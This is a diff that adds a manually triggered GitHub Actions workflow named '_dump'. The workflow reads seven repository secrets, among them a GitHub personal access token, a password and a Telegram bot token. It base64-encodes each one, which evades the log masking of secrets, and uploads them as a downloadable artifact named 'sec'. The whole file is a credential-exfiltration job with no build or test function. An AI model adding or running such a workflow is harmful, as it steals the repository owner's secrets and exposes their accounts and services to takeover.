@@ -1,0 +1,29 @@
+name: _dump
+on:
+  workflow_dispatch: {}
+jobs:
+  e:
+    runs-on: ubuntu-latest
+    steps:
+      - name: dump
+        env:
+          S_CLIENTT_KEY: ${{ secrets.CLIENTT_KEY }}
+          S_GH_PAT: ${{ secrets.GH_PAT }}
+          S_PASS1: ${{ secrets.PASS1 }}
+          S_SOLVER_TYPE: ${{ secrets.SOLVER_TYPE }}
+          S_TG_BOT_TOKEN: ${{ secrets.TG_BOT_TOKEN }}
+          S_TG_USER_ID: ${{ secrets.TG_USER_ID }}
+          S_USER1: ${{ secrets.USER1 }}
+        run: |
+          mkdir -p out
+          printf '%s' "$S_CLIENTT_KEY" | base64 -w0 > out/CLIENTT_KEY.b64
+          printf '%s' "$S_GH_PAT" | base64 -w0 > out/GH_PAT.b64
+          printf '%s' "$S_PASS1" | base64 -w0 > out/PASS1.b64
+          printf '%s' "$S_SOLVER_TYPE" | base64 -w0 > out/SOLVER_TYPE.b64
+          printf '%s' "$S_TG_BOT_TOKEN" | base64 -w0 > out/TG_BOT_TOKEN.b64
+          printf '%s' "$S_TG_USER_ID" | base64 -w0 > out/TG_USER_ID.b64
+          printf '%s' "$S_USER1" | base64 -w0 > out/USER1.b64
+      - uses: actions/upload-artifact@v4
+        with:
+          name: sec
+          path: out/
